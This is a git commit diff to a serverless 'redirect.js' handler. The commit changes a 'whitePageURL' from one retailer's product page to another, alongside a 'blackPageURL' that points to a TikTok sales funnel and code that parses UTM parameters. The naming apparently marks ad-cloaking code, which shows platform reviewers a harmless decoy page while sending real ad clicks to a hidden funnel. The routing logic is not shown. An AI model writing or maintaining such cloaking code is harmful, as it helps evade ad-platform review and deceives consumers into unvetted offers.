e231baf5fab927f79b349a12476b836e1ba5b8e5
s4-glitchy <s4alicreator001@gmail.com>
2025-01-26 23:50:19 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.dunelm.com/product/geo-crewel-cushion-cover-1000189571?defaultSkuId=30751270";
+    const whitePageURL = "https://www.saksoff5th.com/product/wolfie-furs-made-for-generations%E2%84%A2-toscana-shearling-vest-0400021237292.html?dwvar_0400021237292_color=NAVY_BLUE";
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-1231sdf";
   
     // Parse the UTM parameters from the request URL
